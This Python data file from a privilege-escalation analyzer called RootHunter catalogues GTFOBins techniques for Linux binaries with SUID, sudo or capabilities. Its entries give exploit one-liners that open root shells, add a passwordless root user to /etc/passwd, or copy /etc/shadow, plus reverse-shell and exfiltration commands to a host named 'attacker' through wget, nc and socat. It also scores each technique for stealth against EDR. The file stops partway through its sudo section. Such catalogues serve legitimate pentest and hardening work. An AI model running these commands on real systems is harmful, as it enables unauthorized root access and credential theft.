# =============================================================================
#  gtfobins.py — Base local de técnicas de escalada por binario
#  Parte de la suite RootHunter (rh-analyze)
#
#  Cada entrada describe cómo abusar de un binario cuando tiene:
#    - bit SUID
#    - permiso sudo (con o sin NOPASSWD)
#    - capability específica
#
#  Las técnicas son las documentadas públicamente en GTFOBins.
#  Solo análisis defensivo: este archivo NO ejecuta nada.
#
#  Schema de cada entrada:
#    {
#      'verify': comando no destructivo para confirmar que el vector funciona
#      'exploit': comando que abre shell como root (o eleva privilegios)
#      'why': por qué funciona (1 línea)
#      'success': qué se ve si la explotación funcionó
#      'notes': caveats opcionales (sintaxis específica, versiones, etc.)
#      'ref': URL a GTFOBins
#      # Priorización pentester (1-5, opcional):
#      'reliability': 1-5  ¿qué tan probable es que funcione? (default por categoría)
#      'stealth':     1-5  ¿qué tan ruidoso? (default por categoría)
#      'speed':       1-5  ¿qué tan rápido es el shell? (default por categoría)
#    }
#
#  Los campos reliability/stealth/speed son OPCIONALES. Si no se especifican,
#  se aplican defaults sensatos según la categoría (SUID/SUDO/CAPABILITY).
#  Solo se overridean en técnicas que desvían claramente del default.
#
#  IMPORTANTE: en SUID, muchos binarios requieren -p o equivalente para
#  preservar el euid. Sin -p, bash/sh dropean privilegios al iniciar.
# =============================================================================

# ─── Defaults de scoring por categoría ────────────────────────────────────────
# Valores promedio razonables para cada categoría de técnica.
# Cualquier técnica individual puede sobreescribir estos defaults.

DEFAULTS = {
    # SUID con técnica documentada en GTFOBins, comando estándar.
    # - reliability=4: GTFOBins funciona en distros estándar; baja a 3 si
    #   requiere features opcionales (vim+python3, php+pcntl, etc.)
    # - stealth=3: spawn de shell desde un binario inesperado dispara
    #   alertas en EDR/auditd modernos
    # - speed=5: comando único, shell instantáneo
    'suid': {'reliability': 4, 'stealth': 3, 'speed': 5},

    # Sudo NOPASSWD con técnica documentada.
    # - reliability=5: si la regla existe, funciona; sudo no falla
    # - stealth=4: sudo audita, pero el comando es legítimo y se mezcla
    # - speed=5: instantáneo
    'sudo': {'reliability': 5, 'stealth': 4, 'speed': 5},

    # Capabilities con técnica documentada.
    # - reliability=4: depende de que el binario aún tenga la cap montada
    #   (algunos filesystems se montan con nosuid/noexec)
    # - stealth=3: similar a SUID, EDR puede detectar setuid syscalls anómalos
    # - speed=5: instantáneo
    'capability': {'reliability': 4, 'stealth': 3, 'speed': 5},
}


def score_technique(reliability: int, stealth: int, speed: int) -> tuple[int, int]:
    """Calcula (score, tier) para una técnica.

    score = reliability*2 + stealth + speed   (rango: 4-25)
    tier:
      1 — "Win fácil"      (score >= 18): empezar acá
      2 — "Plan B"         (12-17): si tier 1 falla
      3 — "Último recurso" (< 12): kernel exploits, races, etc.
    """
    score = reliability * 2 + stealth + speed
    if score >= 18:
        tier = 1
    elif score >= 12:
        tier = 2
    else:
        tier = 3
    return score, tier


def get_scoring(technique: dict, category: str) -> tuple[int, int, int]:
    """Devuelve (reliability, stealth, speed) para una técnica.

    Si la técnica define los campos, los usa. Si no, aplica el default
    de la categoría ('suid', 'sudo', 'capability').
    """
    d = DEFAULTS.get(category, DEFAULTS['suid'])
    return (
        technique.get('reliability', d['reliability']),
        technique.get('stealth', d['stealth']),
        technique.get('speed', d['speed']),
    )


# ─── Sistema de verificación por niveles ─────────────────────────────────────
# Cada técnica puede declarar 'verify_levels': lista de tuplas
#   (level, command, expected_pattern_or_description)
#
# Niveles:
#   'precondition'  — el vector existe (path/perms correctos). NO destructivo,
#                     instantáneo, siempre seguro. Ejemplos: stat del path,
#                     existencia del archivo, sudo -nl.
#   'capability'    — el binario tiene la feature necesaria (ej. vim+python3,
#                     find -exec, nc -e). NO destructivo, siempre seguro.
#   'dry_run'       — variante mínima del exploit que confirma viabilidad
#                     SIN abrir shell ni modificar nada. Reservado para
#                     `rh-analyze --confirm` (opt-in).
#
# Un campo 'expected' acompaña cada nivel y describe qué se ve si el chequeo
# pasó. El analyzer lo muestra al humano para que pueda decidir.
#
# REGLA INVIOLABLE PARA dry_run:
#   1. NO spawnea shell interactiva (usar id, whoami, head; nunca sh/bash sueltos)
#   2. NO modifica el sistema (nada de chmod, cp, mv, tee, >>)
#   3. NO hace conexiones de red salientes (nada de nc attacker, curl http)
#
# Si una técnica no puede tener dry_run seguro, se omite ese nivel.

def get_verify_levels(technique: dict) -> list[tuple[str, str, str]]:
    """Devuelve los niveles de verificación de una técnica como lista de tuplas.

    Si la técnica usa el campo 'verify_levels' (nuevo schema), lo devuelve.
    Si solo tiene 'verify' (string, schema viejo), lo envuelve como un único
    nivel 'precondition' para mantener compatibilidad.
    """
    if 'verify_levels' in technique:
        return list(technique['verify_levels'])
    if technique.get('verify'):
        return [('precondition', technique['verify'], 'comando ejecuta sin error')]
    return []


def get_dry_run(technique: dict) -> tuple[str, str] | None:
    """Devuelve (cmd, expected) del dry_run si existe, o None.

    Solo se usa cuando el operador pasa `--confirm` explícitamente.
    """
    for level, cmd, exp in get_verify_levels(technique):
        if level == 'dry_run':
            return cmd, exp
    return None


# ─── SUID ─────────────────────────────────────────────────────────────────────
# Para binarios con bit SUID activo. El comando se ejecuta como tu usuario,
# pero el binario corre con euid del owner (usualmente root).

SUID = {
    'find': {
        'verify_levels': [
            ('precondition',
             'stat -c "%U %a" /usr/bin/find 2>/dev/null',
             'esperado: "root 4xxx" (owner root + bit SUID)'),
            ('capability',
             'find --help 2>&1 | grep -q -- "-exec" && echo CAPABILITY_OK',
             'esperado: CAPABILITY_OK'),
            ('dry_run',
             '/usr/bin/find /tmp -maxdepth 0 -exec id \\;',
             'esperado: euid=0(root) en stdout'),
        ],
        'exploit': r'/usr/bin/find . -exec /bin/sh -p \; -quit',
        'why': '-exec hereda el euid del proceso find',
        'success': 'id  → debe mostrar euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/find/#suid',
    },
    'vim': {
        'verify_levels': [
            ('precondition',
             'stat -c "%U %a" $(which vim) 2>/dev/null',
             'esperado: "root 4xxx"'),
            ('capability',
             'vim --version 2>/dev/null | grep -q "+python3" && echo HAS_PYTHON3 || echo NO_PYTHON3',
             'esperado: HAS_PYTHON3 (sin esto cae al fallback :!sh -p)'),
            # dry_run: usa :py3 import os; print(os.geteuid()) en modo -e (ex)
            # No abre shell, solo imprime el euid efectivo
            ('dry_run',
             '''vim -e -c ':py3 import os; print("DRYRUN_EUID=", os.geteuid())' -c ':q!' 2>&1 | grep DRYRUN_EUID''',
             'esperado: DRYRUN_EUID= 0'),
        ],
        'exploit': r'''vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-p")' ''',
        'why': 'vim soporta ejecución de Python; os.execl preserva euid con sh -p',
        'success': 'shell con prompt #, id muestra euid=0',
        'notes': 'Si vim no tiene +python3, probar :!/bin/sh -p',
        'reliability': 3,  # depende de +python3 (común en distros estándar)
        'stealth': 2,      # EDR detecta python desde vim como anómalo
        'ref': 'https://gtfobins.github.io/gtfobins/vim/#suid',
    },
    'vi': {
        'verify': 'vi --version 2>&1 | head -1',
        'exploit': "vi -c ':!/bin/sh -p'",
        'why': 'vi permite ejecutar comandos externos via :!',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/vi/#suid',
    },
    'nano': {
        'verify': 'nano --version | head -1',
        'exploit': 'nano  # Ctrl+R, Ctrl+X, luego: reset; sh 1>&0 2>&0',
        'why': 'nano permite ejecutar comandos con Ctrl+R seguido de Ctrl+X',
        'success': 'shell interactiva con euid=0',
        'notes': 'Solo funciona si nano se compiló con --enable-restricted=no',
        'reliability': 2,  # depende de build option no estándar
        'stealth': 2,      # secuencia de teclas inusual
        'speed': 4,        # requiere interacción manual
        'ref': 'https://gtfobins.github.io/gtfobins/nano/#suid',
    },
    'less': {
        'verify_levels': [
            ('precondition',
             'stat -c "%U %a" $(which less) 2>/dev/null',
             'esperado: "root 4xxx"'),
            ('capability',
             # less con SUID puede usar LESSSECURE para deshabilitar !; verificamos que NO esté
             'env | grep -q LESSSECURE && echo BLOCKED_BY_LESSSECURE || echo OK',
             'esperado: OK (LESSSECURE no debe estar activo)'),
            # less no tiene un dry_run trivial sin abrir el pager — omitimos
        ],
        'exploit': 'less /etc/profile  # luego escribir: !/bin/sh -p',
        'why': 'less permite spawnear shell con prefijo !',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/less/#suid',
    },
    'more': {
        'verify': 'more --version 2>&1 | head -1',
        'exploit': 'more /etc/profile  # luego: !/bin/sh -p',
        'why': 'more permite ejecutar comandos con !',
        'success': 'shell con euid=0',
        'notes': 'Requiere terminal pequeña para activar el pager (resize si hace falta)',
        'ref': 'https://gtfobins.github.io/gtfobins/more/#suid',
    },
    'man': {
        'verify': 'man --version | head -1',
        'exploit': 'man man  # luego: !/bin/sh -p',
        'why': 'man usa pager (less/more), heredando la técnica',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/man/#suid',
    },
    'awk': {
        'verify_levels': [
            ('precondition',
             'stat -c "%U %a" $(which awk) 2>/dev/null',
             'esperado: "root 4xxx"'),
            ('capability',
             # awk debe soportar system(); todos los awk modernos lo hacen
             """awk 'BEGIN { print "CAPABILITY_OK" }' 2>/dev/null""",
             'esperado: CAPABILITY_OK'),
            ('dry_run',
             """awk 'BEGIN {system("id")}' 2>&1""",
             'esperado: euid=0(root) en stdout'),
        ],
        'exploit': r"""awk 'BEGIN {system("/bin/sh -p")}'""",
        'why': 'awk ejecuta comandos arbitrarios via system()',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/awk/#suid',
    },
    'gawk': {
        'verify': 'gawk --version | head -1',
        'exploit': r"""gawk 'BEGIN {system("/bin/sh -p")}'""",
        'why': 'gawk ejecuta comandos arbitrarios via system()',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/gawk/#suid',
    },
    'python': {
        'verify_levels': [
            ('precondition',
             'stat -c "%U %a" $(which python) 2>/dev/null',
             'esperado: "root 4xxx"'),
            ('capability',
             'python -c "import os; print(\'CAPABILITY_OK\')" 2>/dev/null',
             'esperado: CAPABILITY_OK'),
            ('dry_run',
             'python -c "import os; print(\'DRYRUN_EUID=\', os.geteuid())"',
             'esperado: DRYRUN_EUID= 0'),
        ],
        'exploit': r"""python -c 'import os; os.execl("/bin/sh", "sh", "-p")'""",
        'why': 'os.execl preserva el euid si se invoca sh con -p',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/python/#suid',
    },
    'python3': {
        'verify_levels': [
            ('precondition',
             'stat -c "%U %a" $(which python3) 2>/dev/null',
             'esperado: "root 4xxx"'),
            ('capability',
             'python3 -c "import os; print(\'CAPABILITY_OK\')" 2>/dev/null',
             'esperado: CAPABILITY_OK'),
            ('dry_run',
             'python3 -c "import os; print(\'DRYRUN_EUID=\', os.geteuid())"',
             'esperado: DRYRUN_EUID= 0'),
        ],
        'exploit': r"""python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'""",
        'why': 'os.execl preserva el euid si se invoca sh con -p',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/python3/#suid',
    },
    'perl': {
        'verify_levels': [
            ('precondition',
             'stat -c "%U %a" $(which perl) 2>/dev/null',
             'esperado: "root 4xxx"'),
            ('capability',
             'perl -e "print \\"CAPABILITY_OK\\n\\"" 2>/dev/null',
             'esperado: CAPABILITY_OK'),
            ('dry_run',
             'perl -e "print \\"DRYRUN_EUID=\\", $>, \\"\\n\\""',
             'esperado: DRYRUN_EUID=0'),
        ],
        'exploit': r"""perl -e 'exec "/bin/sh", "-p";'""",
        'why': 'exec() de Perl preserva el euid con sh -p',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/perl/#suid',
    },
    'ruby': {
        'verify': 'ruby --version',
        'exploit': r"""ruby -e 'exec "/bin/sh", "-p"'""",
        'why': 'exec() de Ruby preserva el euid',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/ruby/#suid',
    },
    'lua': {
        'verify': 'lua -v 2>&1',
        'exploit': r"""lua -e 'os.execute("/bin/sh -p")'""",
        'why': 'os.execute() spawnea shell preservando privilegios',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/lua/#suid',
    },
    'node': {
        'verify': 'node --version',
        'exploit': r"""node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0,1,2]});'""",
        'why': 'child_process.spawn hereda euid con sh -p',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/node/#suid',
    },
    'php': {
        'verify': 'php --version | head -1',
        'exploit': """php -r "pcntl_exec('/bin/sh', ['-p']);" """,
        'why': 'pcntl_exec preserva el euid',
        'success': 'shell con euid=0',
        'notes': 'Requiere extensión pcntl. Alternativa: php -r "system(\'/bin/sh -p\');"',
        'reliability': 3,  # pcntl no siempre habilitado en CLI
        'ref': 'https://gtfobins.github.io/gtfobins/php/#suid',
    },
    'env': {
        'verify_levels': [
            ('precondition',
             'stat -c "%U %a" $(which env) 2>/dev/null',
             'esperado: "root 4xxx"'),
            # env no tiene capability extra: si funciona como SUID, funciona y punto
            ('dry_run',
             'env id',
             'esperado: euid=0(root)'),
        ],
        'exploit': 'env /bin/sh -p',
        'why': 'env ejecuta comandos preservando euid si se pasa -p al shell',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/env/#suid',
    },
    'bash': {
        'verify_levels': [
            ('precondition',
             'stat -c "%U %a" $(which bash) 2>/dev/null',
             'esperado: "root 4xxx"'),
            # bash -p funciona si es SUID — sin features extras
            ('dry_run',
             'bash -p -c "id"',
             'esperado: euid=0(root)'),
        ],
        'exploit': 'bash -p',
        'why': '-p preserva el euid en bash; sin él, bash dropea privilegios',
        'success': 'shell con euid=0',
        'reliability': 5,  # comando trivial, sin features externas
        'ref': 'https://gtfobins.github.io/gtfobins/bash/#suid',
    },
    'sh': {
        'verify_levels': [
            ('precondition',
             'stat -c "%U %a" $(readlink -f $(which sh)) 2>/dev/null',
             'esperado: "root 4xxx" (resuelve el symlink real)'),
            ('dry_run',
             'sh -p -c "id"',
             'esperado: euid=0(root)'),
        ],
        'exploit': 'sh -p',
        'why': '-p preserva el euid',
        'success': 'shell con euid=0',
        'reliability': 5,
        'ref': 'https://gtfobins.github.io/gtfobins/sh/#suid',
    },
    'dash': {
        'verify_levels': [
            ('precondition',
             'stat -c "%U %a" $(which dash) 2>/dev/null',
             'esperado: "root 4xxx"'),
            ('dry_run',
             'dash -p -c "id"',
             'esperado: euid=0(root)'),
        ],
        'exploit': 'dash -p',
        'why': '-p preserva el euid',
        'success': 'shell con euid=0',
        'reliability': 5,
        'ref': 'https://gtfobins.github.io/gtfobins/dash/#suid',
    },
    'tee': {
        'verify': 'tee --version | head -1',
        'exploit': 'LFILE=/etc/passwd; echo "root2::0:0:::/bin/bash" | tee -a $LFILE',
        'why': 'tee con SUID puede escribir archivos arbitrarios como root',
        'success': 'línea agregada a /etc/passwd; luego: su root2',
        'notes': 'No spawnea shell directamente: la idea es escribir un archivo crítico',
        'speed': 3,        # requiere paso adicional (su root2)
        'stealth': 2,      # modificación de /etc/passwd es muy ruidosa
        'ref': 'https://gtfobins.github.io/gtfobins/tee/#suid',
    },
    'cp': {
        'verify': 'cp --version | head -1',
        'exploit': 'cp /etc/shadow /tmp/shadow.copy && cat /tmp/shadow.copy',
        'why': 'cp lee/escribe como root, exfiltrando archivos sensibles',
        'success': 'archivo de shadow accesible para crackear',
        'speed': 3,        # exfil + crack offline, no shell directa
        'ref': 'https://gtfobins.github.io/gtfobins/cp/#suid',
    },
    'mv': {
        'verify': 'mv --version | head -1',
        'exploit': 'mv archivo_malicioso /etc/cron.d/rooter',
        'why': 'mv puede sobrescribir archivos como root',
        'success': 'archivo movido; útil para inyectar cron jobs',
        'speed': 2,        # depende del cron disparándose
        'ref': 'https://gtfobins.github.io/gtfobins/mv/#suid',
    },
    'chmod': {
        'verify': 'chmod --version | head -1',
        'exploit': 'chmod u+s /bin/bash  # luego: bash -p',
        'why': 'chmod puede aplicar SUID a otros binarios',
        'success': 'bash queda con SUID; bash -p da euid=0',
        'speed': 4,        # 2 pasos: chmod + bash -p
        'ref': 'https://gtfobins.github.io/gtfobins/chmod/#suid',
    },
    'chown': {
        'verify': 'chown --version | head -1',
        'exploit': 'chown root:root /tmp/myshell && chmod u+s /tmp/myshell',
        'why': 'chown puede cambiar owner; combinado con chmod permite SUID',
        'success': 'binario propio queda como SUID root',
        'speed': 3,        # requiere preparar binario y dos pasos
        'ref': 'https://gtfobins.github.io/gtfobins/chown/#suid',
    },
    'dd': {
        'verify': 'dd --version | head -1',
        'exploit': 'echo "root2::0:0:::/bin/bash" | dd of=/etc/passwd oflag=append conv=notrunc',
        'why': 'dd escribe a archivos arbitrarios con privilegios',
        'success': 'línea agregada a /etc/passwd',
        'speed': 3,
        'stealth': 2,
        'ref': 'https://gtfobins.github.io/gtfobins/dd/#suid',
    },
    'tar': {
        'verify_levels': [
            ('precondition',
             'stat -c "%U %a" $(which tar) 2>/dev/null',
             'esperado: "root 4xxx"'),
            ('capability',
             'tar --help 2>&1 | grep -q "checkpoint-action" && echo CAPABILITY_OK',
             'esperado: CAPABILITY_OK (GNU tar moderno)'),
            # No dry_run: --checkpoint-action=exec ES el exploit. Sin forma segura
            # de probar la primitiva sin ejecutar comando arbitrario.
        ],
        'exploit': r"""tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh""",
        'why': '--checkpoint-action=exec ejecuta comandos arbitrarios',
        'success': 'shell spawneada (no preserva euid en SUID — ver sudo)',
        'notes': 'En SUID puro tar no preserva euid; mejor en sudo o cron escribible',
        'reliability': 2,  # sin -p sh dropea privs en SUID puro
        'ref': 'https://gtfobins.github.io/gtfobins/tar/#suid',
    },
    'zip': {
        'verify': 'zip --version | head -2',
        'exploit': 'TF=$(mktemp -u); zip $TF /etc/hosts -T -TT "sh #"',
        'why': '-T y -TT permiten ejecutar comandos como tester',
        'success': 'shell spawneada con privilegios del SUID',
        'reliability': 3,
        'speed': 4,
        'ref': 'https://gtfobins.github.io/gtfobins/zip/#suid',
    },
    'unzip': {
        'verify': 'unzip -v | head -1',
        'exploit': 'unzip -K malicious.zip  # -K preserva SUID/SGID al extraer',
        'why': '-K mantiene bits SUID al extraer archivos',
        'success': 'archivos extraídos con bits SUID intactos',
        'reliability': 2,  # requiere preparar zip con SUID-bash adentro
        'speed': 3,
        'ref': 'https://gtfobins.github.io/gtfobins/unzip/#suid',
    },
    'curl': {
        'verify': 'curl --version | head -1',
        'exploit': 'curl file:///etc/shadow',
        'why': 'curl puede leer archivos locales con privilegios elevados',
        'success': 'contenido de /etc/shadow en stdout',
        'speed': 3,        # lectura, no shell — requiere crack offline
        'ref': 'https://gtfobins.github.io/gtfobins/curl/#suid',
    },
    'wget': {
        'verify': 'wget --version | head -1',
        'exploit': 'wget --post-file=/etc/shadow http://attacker:8000/',
        'why': 'wget puede leer archivos locales y enviarlos via POST',
        'success': '/etc/shadow llega al servidor del atacante',
        'speed': 3,
        'stealth': 2,      # POST a IP externa
        'ref': 'https://gtfobins.github.io/gtfobins/wget/#suid',
    },
    'nc': {
        'verify': 'nc -h 2>&1 | head -2',
        'exploit': 'nc -e /bin/sh -p attacker 4444',
        'why': '-e ejecuta programa al conectar (preserva euid si tiene -p)',
        'success': 'reverse shell con euid=0 en el listener',
        'notes': 'No todas las variantes de nc tienen -e; alternativa: nc | sh',
        'reliability': 2,  # OpenBSD variant no tiene -e
        'stealth': 2,      # conexión saliente a IP externa = alerta
        'ref': 'https://gtfobins.github.io/gtfobins/nc/#suid',
    },
    'socat': {
        'verify': 'socat -V | head -1',
        'exploit': 'socat TCP:attacker:4444 EXEC:"/bin/sh -p",pty,stderr',
        'why': 'EXEC ejecuta shell preservando privilegios',
        'success': 'reverse shell con euid=0',
        'stealth': 2,  # conexión saliente a IP externa
        'ref': 'https://gtfobins.github.io/gtfobins/socat/#suid',
    },
    'gdb': {
        'verify_levels': [
            ('precondition',
             'stat -c "%U %a" $(which gdb) 2>/dev/null',
             'esperado: "root 4xxx"'),
            ('capability',
             '''gdb -batch -ex 'python print("CAPABILITY_OK")' 2>&1 | grep CAPABILITY_OK''',
             'esperado: CAPABILITY_OK'),
            ('dry_run',
             '''gdb -batch -nx -ex 'python import os; print("DRYRUN_EUID=", os.geteuid())' 2>&1 | grep DRYRUN_EUID''',
             'esperado: DRYRUN_EUID= 0'),
        ],
        'exploit': r"""gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit""",
        'why': 'gdb embebe Python que puede execl con privilegios',
        'success': 'shell con euid=0',
        'stealth': 2,  # ptrace activity es muy llamativa
        'ref': 'https://gtfobins.github.io/gtfobins/gdb/#suid',
    },
    'strace': {
        'verify': 'strace -V',
        'exploit': 'strace -o /dev/null /bin/sh -p',
        'why': 'strace ejecuta el comando heredando euid del proceso strace',
        'success': 'shell con euid=0',
        'stealth': 2,
        'ref': 'https://gtfobins.github.io/gtfobins/strace/#suid',
    },
    'ltrace': {
        'verify': 'ltrace -V',
        'exploit': 'ltrace -o /dev/null /bin/sh -p',
        'why': 'ltrace ejecuta comandos preservando privilegios',
        'success': 'shell con euid=0',
        'stealth': 2,
        'ref': 'https://gtfobins.github.io/gtfobins/ltrace/#suid',
    },
    'nmap': {
        'verify': 'nmap --version | head -1',
        'exploit': r"""TF=$(mktemp); echo 'os.execute("/bin/sh -p")' > $TF; nmap --script=$TF""",
        'why': 'nmap ejecuta scripts NSE (Lua) que pueden invocar shell',
        'success': 'shell con euid=0',
        'notes': 'Versiones viejas (<5.21) tenían modo --interactive con !sh',
        'reliability': 3,  # versiones modernas no tienen --interactive
        'speed': 4,        # mktemp + redirect
        'ref': 'https://gtfobins.github.io/gtfobins/nmap/#suid',
    },
    'pip': {
        'verify': 'pip --version',
        'exploit': r"""TF=$(mktemp -d); echo 'import os; os.execl("/bin/sh","sh","-p")' > $TF/setup.py; pip install $TF""",
        'why': 'pip ejecuta setup.py con privilegios durante install',
        'success': 'shell con euid=0',
        'speed': 4,        # setup.py + install
        'ref': 'https://gtfobins.github.io/gtfobins/pip/#suid',
    },
    'pip3': {
        'verify': 'pip3 --version',
        'exploit': r"""TF=$(mktemp -d); echo 'import os; os.execl("/bin/sh","sh","-p")' > $TF/setup.py; pip3 install $TF""",
        'why': 'pip3 ejecuta setup.py con privilegios durante install',
        'success': 'shell con euid=0',
        'speed': 4,
        'ref': 'https://gtfobins.github.io/gtfobins/pip/#suid',
    },
    'docker': {
        'verify_levels': [
            ('precondition',
             'ls -la /var/run/docker.sock 2>/dev/null || ls -la /run/docker.sock 2>/dev/null',
             'esperado: socket existe (suid del binario es secundario)'),
            ('capability',
             'docker version --format "{{.Client.Version}}" 2>/dev/null',
             'esperado: versión del cliente (confirma comunicación con daemon)'),
            ('dry_run',
             # Listar containers. Si hay permisos, devuelve lista (puede estar vacía).
             # Si no hay permisos, da error.
             'docker ps -q 2>&1 | head -3',
             'esperado: lista de IDs (o vacío) sin "permission denied"'),
        ],
        'exploit': 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
        'why': 'docker monta el filesystem del host; chroot da acceso total',
        'success': 'shell con root real del host',
        'notes': 'No requiere SUID estrictamente — basta con grupo docker o socket accesible',
        'reliability': 5,
        'stealth': 2,      # docker run con bind-mount de / es muy llamativo
        'ref': 'https://gtfobins.github.io/gtfobins/docker/#suid',
    },
    'git': {
        'verify': 'git --version',
        'exploit': r"""git -p help config  # luego en pager: !/bin/sh -p""",
        'why': 'git usa pager (less) que permite spawn de shell',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/git/#suid',
    },
    'make': {
        'verify': 'make --version | head -1',
        'exploit': r"""COMMAND='/bin/sh -p'; make -s --eval=$'x:\n\t-'"$COMMAND" """,
        'why': 'make ejecuta recetas como subprocesos heredando euid',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/make/#suid',
    },
    'mysql': {
        'verify': 'mysql --version',
        'exploit': r"""mysql -e '\! /bin/sh -p'""",
        'why': '\\! ejecuta comandos del shell preservando euid',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/mysql/#suid',
    },
    'sqlite3': {
        'verify': 'sqlite3 --version',
        'exploit': r"""sqlite3 /dev/null -cmd '.shell /bin/sh -p'""",
        'why': '.shell de sqlite3 ejecuta comandos del SO',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/sqlite3/#suid',
    },
    'openssl': {
        'verify': 'openssl version',
        'exploit': 'openssl req -engine /tmp/malicious.so',
        'why': '-engine carga librerías compartidas como euid',
        'success': 'código del .so ejecutado como root',
        'notes': 'Requiere preparar primero un .so malicioso',
        'reliability': 2,  # requiere compilar .so
        'speed': 2,
        'ref': 'https://gtfobins.github.io/gtfobins/openssl/#suid',
    },
    'pkexec': {
        'verify': 'pkexec --version',
        'exploit': 'pkexec /bin/sh',
        'why': 'pkexec eleva a root tras autenticación de admin',
        'success': 'shell como root tras password de admin',
        'notes': 'Para PwnKit (CVE-2021-4034) ver exploit dedicado, no requiere password',
        'ref': 'https://gtfobins.github.io/gtfobins/pkexec/#suid',
    },
    'rsync': {
        'verify': 'rsync --version | head -1',
        'exploit': 'rsync -e "sh -c \'sh -p 0<&2 1>&2\'" 127.0.0.1:/dev/null',
        'why': '-e permite ejecutar comando arbitrario en lugar de ssh',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/rsync/#suid',
    },
    'expect': {
        'verify': 'expect -v',
        'exploit': r"""expect -c 'spawn /bin/sh -p; interact'""",
        'why': 'expect spawnea procesos preservando euid',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/expect/#suid',
    },
    'time': {
        'verify': 'time --version 2>&1 | head -1',
        'exploit': '/usr/bin/time /bin/sh -p',
        'why': 'time ejecuta el comando hijo heredando euid',
        'success': 'shell con euid=0',
        'notes': 'Solo /usr/bin/time, no el builtin de bash',
        'ref': 'https://gtfobins.github.io/gtfobins/time/#suid',
    },
    'taskset': {
        'verify': 'taskset --version | head -1',
        'exploit': 'taskset 1 /bin/sh -p',
        'why': 'taskset ejecuta el comando hijo con euid heredado',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/taskset/#suid',
    },
    'watch': {
        'verify': 'watch --version | head -1',
        'exploit': 'watch -x sh -c "reset; exec sh -p 1>&0 2>&0"',
        'why': '-x ejecuta comando directamente preservando euid',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/watch/#suid',
    },
    'ionice': {
        'verify': 'ionice --version | head -1',
        'exploit': 'ionice /bin/sh -p',
        'why': 'ionice ejecuta el comando hijo heredando euid',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/ionice/#suid',
    },
    'nice': {
        'verify': 'nice --version | head -1',
        'exploit': 'nice /bin/sh -p',
        'why': 'nice ejecuta el comando hijo heredando euid',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/nice/#suid',
    },
    'timeout': {
        'verify': 'timeout --version | head -1',
        'exploit': 'timeout 7d /bin/sh -p',
        'why': 'timeout ejecuta comando hijo heredando euid',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/timeout/#suid',
    },
    'ftp': {
        'verify': 'ftp -? 2>&1 | head -1',
        'exploit': 'ftp  # luego en prompt: !/bin/sh -p',
        'why': 'ftp permite spawn de shell con !',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/ftp/#suid',
    },
    'tftp': {
        'verify': 'tftp -h 2>&1 | head -1',
        'exploit': 'tftp 127.0.0.1  # luego: !/bin/sh -p',
        'why': 'tftp permite spawn de shell con !',
        'success': 'shell con euid=0',
        'ref': 'https://gtfobins.github.io/gtfobins/tftp/#suid',
    },
    'snap': {
        'verify': 'snap --version 2>&1 | head -1',
        'exploit': r"""# Crear un snap malicioso e instalarlo con --dangerous""",
        'why': 'snap install --dangerous ejecuta hooks como root',
        'success': 'hook ejecutado como root durante install',
        'notes': 'Más complejo — ver GTFOBins para snap completo',
        'reliability': 2,
        'speed': 2,
        'ref': 'https://gtfobins.github.io/gtfobins/snap/#suid',
    },
}

# ─── SUDO ─────────────────────────────────────────────────────────────────────
# Para entradas tipo 'user ALL=(ALL) [NOPASSWD:] /usr/bin/X'
# Se asume que 'sudo X' funciona; ajustar según la regla específica.

SUDO = {
    'find': {
        'verify_levels': [
            ('precondition',
             'sudo -nl 2>/dev/null | grep -E "NOPASSWD.*find"',
             'esperado: línea con NOPASSWD que mencione find'),
            ('capability',
             'find --help 2>&1 | grep -q -- "-exec" && echo CAPABILITY_OK',
             'esperado: CAPABILITY_OK'),
            ('dry_run',
             'sudo -n find /tmp -maxdepth 0 -exec id \\; 2>&1',
             'esperado: uid=0(root) en stdout'),
        ],
        'exploit': r'sudo find . -exec /bin/sh \; -quit',
        'why': '-exec spawnea sh con privilegios de sudo',
        'success': 'shell como root inmediato',
        'ref': 'https://gtfobins.github.io/gtfobins/find/#sudo',
    },
    'vim': {
        'verify_levels': [
            ('precondition',
             'sudo -nl 2>/dev/null | grep -E "NOPASSWD.*vim"',
             'esperado: línea con NOPASSWD que mencione vim'),
            # Para sudo vim no necesitamos +python3: :! funciona siempre
            ('dry_run',
             # sudo vim -e ejecuta en modo ex (sin TUI), :!id imprime id como root
             'sudo -n vim -e -c ":!id" -c ":q!" 2>&1 | grep -E "uid="',
             'esperado: uid=0(root)'),
        ],
